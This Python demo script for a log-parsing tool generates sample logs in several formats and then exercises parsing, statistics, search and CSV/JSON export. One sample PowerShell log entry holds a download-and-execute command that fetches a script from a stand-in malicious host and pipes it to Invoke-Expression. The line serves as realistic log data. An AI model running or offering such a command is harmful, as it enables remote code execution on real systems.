#!/usr/bin/env python3
"""
Demo script for Intelligent Log Processor
Creates sample logs and demonstrates all features
"""

import sys
from pathlib import Path
from datetime import datetime, timedelta
import random

sys.path.insert(0, str(Path(__file__).parent))

from log_processor import LogProcessor, LogParser


def create_sample_logs():
    """Create sample log files in various formats"""
    
    log_dir = Path("sample_logs")
    log_dir.mkdir(exist_ok=True)
    
    print("Creating sample log files...")
    
    # 1. Windows Event Log style
    windows_log = log_dir / "windows_events.log"
    with open(windows_log, 'w') as f:
        f.write("""EventID: 4624
Level: Information
TimeCreated: 12/15/2024 10:30:45 AM
Source: Microsoft-Windows-Security-Auditing
Computer: WORKSTATION01
User: DOMAIN\\john.doe
Message: An account was successfully logged on

EventID: 4625
Level: Warning
TimeCreated: 12/15/2024 10:31:22 AM
Source: Microsoft-Windows-Security-Auditing
Computer: WORKSTATION01
User: DOMAIN\\admin
Message: An account failed to log on. Reason: Unknown user name or bad password

EventID: 7036
Level: Information
TimeCreated: 12/15/2024 10:35:15 AM
Source: Service Control Manager
Computer: WORKSTATION01
Message: The Windows Update service entered the running state
""")
    
    # 2. Syslog format
    syslog = log_dir / "syslog.log"
    with open(syslog, 'w') as f:
        f.write("""Dec 15 10:30:00 server01 sshd[12345]: Accepted publickey for admin from 192.168.1.100 port 52234 ssh2
Dec 15 10:31:15 server01 kernel: [  120.456789] Out of memory: Kill process 9876 (chrome) score 890
Dec 15 10:32:00 server01 systemd[1]: Started Daily apt download activities
Dec 15 10:33:45 server01 cron[5678]: (root) CMD (run-parts /etc/cron.daily)
Dec 15 10:34:22 server01 sshd[12389]: Failed password for invalid user hacker from 203.0.113.42 port 45678 ssh2
Dec 15 10:35:00 server01 systemd[1]: Stopping The Apache HTTP Server...
""")
    
    # 3. Apache/Nginx access log
    apache_log = log_dir / "apache_access.log"
    with open(apache_log, 'w') as f:
        f.write("""192.168.1.100 - - [15/Dec/2024:10:30:45 +0000] "GET /index.html HTTP/1.1" 200 1234
192.168.1.101 - - [15/Dec/2024:10:31:00 +0000] "POST /api/login HTTP/1.1" 200 567
203.0.113.50 - - [15/Dec/2024:10:31:15 +0000] "GET /admin/config.php HTTP/1.1" 404 890
192.168.1.100 - - [15/Dec/2024:10:32:30 +0000] "GET /images/logo.png HTTP/1.1" 200 45678
10.0.0.50 - - [15/Dec/2024:10:33:00 +0000] "GET /api/users HTTP/1.1" 500 234
192.168.1.102 - - [15/Dec/2024:10:34:15 +0000] "DELETE /api/user/123 HTTP/1.1" 204 0
""")
    
    # 4. PowerShell log style
    powershell_log = log_dir / "powershell.log"
    with open(powershell_log, 'w') as f:
        f.write("""TimeCreated: 2024-12-15T10:30:00.123Z
EventID: 4104
HostName: ConsoleHost
HostApplication: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
RunspaceId: 12345678-1234-1234-1234-123456789012
User: WORKSTATION01\\admin
ScriptBlock: Get-Process | Where-Object {$_.CPU -gt 100}
MessageNumber: 1
MessageTotal: 1

TimeCreated: 2024-12-15T10:31:15.456Z
EventID: 4104
HostName: ConsoleHost
HostApplication: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
RunspaceId: 12345678-1234-1234-1234-123456789012
User: WORKSTATION01\\admin
ScriptBlock: Invoke-WebRequest -Uri http://malicious.com/payload.ps1 | Invoke-Expression
MessageNumber: 1
MessageTotal: 1
""")
    
    # 5. JSON logs
    json_log = log_dir / "app.json"
    with open(json_log, 'w') as f:
        f.write("""{"timestamp":"2024-12-15T10:30:00.000Z","level":"info","service":"api","message":"Server started on port 8080","pid":12345}
{"timestamp":"2024-12-15T10:31:00.000Z","level":"debug","service":"api","message":"Processing request","user":"john.doe","endpoint":"/api/data"}
{"timestamp":"2024-12-15T10:31:15.000Z","level":"error","service":"database","message":"Connection timeout","error":"ECONNREFUSED","retry_count":3}
{"timestamp":"2024-12-15T10:32:00.000Z","level":"warn","service":"auth","message":"Multiple failed login attempts","user":"admin","count":5,"source_ip":"203.0.113.42"}
{"timestamp":"2024-12-15T10:33:00.000Z","level":"info","service":"api","message":"Request completed","duration_ms":245,"status":200}
""")
    
    # 6. Generic application log
    generic_log = log_dir / "application.txt"
    with open(generic_log, 'w') as f:
        f.write("""2024-12-15 10:30:00 [INFO] Application startup complete
2024-12-15 10:31:15 [WARNING] Memory usage high: 85%
2024-12-15 10:32:30 [ERROR] Failed to connect to database: Connection refused
2024-12-15 10:33:00 [INFO] Retrying database connection...
2024-12-15 10:33:05 [INFO] Database connection established
2024-12-15 10:34:00 [DEBUG] Processing batch job: batch_123
2024-12-15 10:35:15 [ERROR] Exception in thread "worker-1": NullPointerException at line 42
""")
    
    # 7. Custom key=value format
    custom_log = log_dir / "custom_app.log"
    with open(custom_log, 'w') as f:
        f.write("""timestamp=2024-12-15T10:30:00Z level=INFO component=auth user=john.doe action=login result=success ip=192.168.1.100
timestamp=2024-12-15T10:31:00Z level=ERROR component=payment user=jane.smith action=checkout result=failed reason="insufficient funds" amount=99.99
timestamp=2024-12-15T10:32:15Z level=WARN component=api endpoint=/api/slow duration=5432ms threshold=1000ms
timestamp=2024-12-15T10:33:00Z level=INFO component=cache action=clear items=1234 size=45MB
timestamp=2024-12-15T10:34:30Z level=DEBUG component=database query="SELECT * FROM users" rows=500 duration=123ms
""")
    
    print(f"✓ Created {len(list(log_dir.glob('*')))} sample log files in {log_dir}/")
    return log_dir


def demo_basic_parsing():
    """Demo 1: Basic log parsing"""
    print("\n" + "="*70)
    print("DEMO 1: Basic Log Parsing with Auto-Detection")
    print("="*70)
    
    log_dir = Path("sample_logs")
    processor = LogProcessor()
    
    # Process each file
    for log_file in sorted(log_dir.glob("*")):
        print(f"\n--- Processing: {log_file.name} ---")
        entries = processor.process_file(log_file)
        
        if entries:
            # Show first entry
            print(f"Sample parsed entry:")
            first = entries[0]
            for key, value in list(first.items())[:8]:  # Show first 8 fields
                if len(str(value)) > 60:
                    value = str(value)[:60] + "..."
                print(f"  {key}: {value}")
            print(f"  ... ({len(first)} total fields)")


def demo_directory_processing():
    """Demo 2: Process entire directory"""
    print("\n" + "="*70)
    print("DEMO 2: Processing Entire Directory")
    print("="*70)
    
    processor = LogProcessor()
    entries = processor.process_directory(Path("sample_logs"), recursive=False)
    
    print(f"\n✓ Processed {len(entries)} total log entries")
    print(f"✓ From {len(set(e['source_file'] for e in entries))} files")


def demo_statistics():
    """Demo 3: Generate statistics"""
    print("\n" + "="*70)
    print("DEMO 3: Log Statistics and Analysis")
    print("="*70)
    
    processor = LogProcessor()
    entries = processor.process_directory(Path("sample_logs"))
    stats = processor.generate_statistics()
    
    print(f"\nTotal entries: {stats['total_entries']}")
    print(f"Files processed: {stats['files_processed']}")
    
    print(f"\nFields found ({len(stats['fields_found'])}):")
    for field in sorted(stats['fields_found'])[:15]:
        print(f"  - {field}")
    if len(stats['fields_found']) > 15:
        print(f"  ... and {len(stats['fields_found']) - 15} more")
    
    print(f"\nTimestamp formats detected:")
    for fmt, count in stats['timestamp_formats'].items():
        print(f"  {fmt}: {count} entries")
    
    if 'earliest' in stats:
        print(f"\nTime range:")
        print(f"  Earliest: {stats['earliest']}")
        print(f"  Latest: {stats['latest']}")
    
    print(f"\nLevel distribution:")
    for level, count in sorted(stats['level_distribution'].items(), key=lambda x: -x[1])[:5]:
        print(f"  {level}: {count}")


def demo_search_filter():
    """Demo 4: Search and filtering"""
    print("\n" + "="*70)
    print("DEMO 4: Search and Filtering")
    print("="*70)
    
    processor = LogProcessor()
    processor.process_directory(Path("sample_logs"))
    
    # Search for "error"
    print("\n--- Searching for 'error' ---")
    errors = processor.search(keyword="error")
    print(f"Found {len(errors)} entries with 'error'")
    for entry in errors[:3]:
        msg = entry.get('message', entry.get('raw_line', ''))[:80]
        print(f"  [{entry.get('timestamp', 'N/A')}] {msg}")
    
    # Search in specific field
    print("\n--- Searching for 'admin' in user field ---")
    admin_entries = processor.search(keyword="admin", field="user")
    print(f"Found {len(admin_entries)} entries")
    
    # Time range filter
    print("\n--- Entries after 10:32 ---")
    later_entries = processor.search(start_time="2024-12-15T10:32:00")
    print(f"Found {len(later_entries)} entries after 10:32")


def demo_output_formats():
    """Demo 5: Different output formats"""
    print("\n" + "="*70)
    print("DEMO 5: Output Formats")
    print("="*70)
    
    processor = LogProcessor()
    entries = processor.process_directory(Path("sample_logs"))
    
    # Save as CSV
    print("\n--- Saving as CSV ---")
    processor.save_results(entries, Path("parsed_logs.csv"), format='csv')
    
    # Save as JSON
    print("\n--- Saving as JSON ---")
    processor.save_results(entries, Path("parsed_logs.json"), format='json')
    
    # Filter and save
    print("\n--- Saving only errors ---")
    errors = processor.search(keyword="error")
    processor.save_results(errors, Path("errors_only.csv"), format='csv')
    
    print(f"\n✓ Created 3 output files")


def demo_field_extraction():
    """Demo 6: Dynamic field extraction"""
    print("\n" + "="*70)
    print("DEMO 6: Dynamic Field Extraction (No Hardcoding!)")
    print("="*70)
    
    parser = LogParser()
    
    # Show how it handles different formats without hardcoded field names
    test_lines = [
        'timestamp=2024-12-15T10:30:00Z user=john level=INFO message="Login successful"',
        'time: 2024-12-15 10:30:00, username: jane, severity: ERROR, text: Connection failed',
        '{"timestamp": "2024-12-15T10:30:00Z", "account": "bob", "priority": "WARN", "details": "Slow query"}',
        '[2024-12-15 10:30:00] USERNAME=alice TYPE=DEBUG MSG=Cache cleared'
    ]
    
    print("\nDemonstrating automatic field extraction from different formats:\n")
    
    for i, line in enumerate(test_lines, 1):
        print(f"Example {i}:")
        print(f"  Input: {line}")
        parsed = parser.parse_line(line, 'generic')
        print(f"  Extracted fields:")
        for key, value in parsed.items():
            if key not in ['raw_line', 'line_number']:
                print(f"    {key}: {value}")
        print()


def show_output_samples():
    """Show sample outputs"""
    print("\n" + "="*70)
    print("Sample Output Files")
    print("="*70)
    
    files = [
        "parsed_logs.csv",
        "parsed_logs.json",
        "errors_only.csv"
    ]
    
    for filename in files:
        path = Path(filename)
        if path.exists():
            size = path.stat().st_size
            print(f"  {filename:30} ({size:,} bytes)")
    
    print("\nTo view:")
    print("  cat parsed_logs.csv | head -20")
    print("  jq '.[0]' parsed_logs.json")


def cleanup_demo():
    """Clean up demo files"""
    import shutil
    
    response = input("\n\nClean up demo files? (y/n): ")
    if response.lower() == 'y':
        shutil.rmtree("sample_logs", ignore_errors=True)
        for f in ["parsed_logs.csv", "parsed_logs.json", "errors_only.csv", "parsed_logs.stats.json"]:
            Path(f).unlink(missing_ok=True)
        print("✓ Cleaned up demo files")


if __name__ == '__main__':
    print("\n")
    print("="*70)
    print("INTELLIGENT LOG PROCESSOR - DEMONSTRATION")
    print("="*70)
    
    try:
        log_dir = create_sample_logs()
        demo_basic_parsing()
        demo_directory_processing()
        demo_statistics()
        demo_search_filter()
        demo_output_formats()
        demo_field_extraction()
        show_output_samples()
        
        print("\n" + "="*70)
        print("✓ All demos completed successfully!")
        print("="*70)
        
        cleanup_demo()
        
    except KeyboardInterrupt:
        print("\n\nDemo interrupted")
    except Exception as e:
        print(f"\n✗ Error: {e}")
        import traceback
        traceback.print_exc()
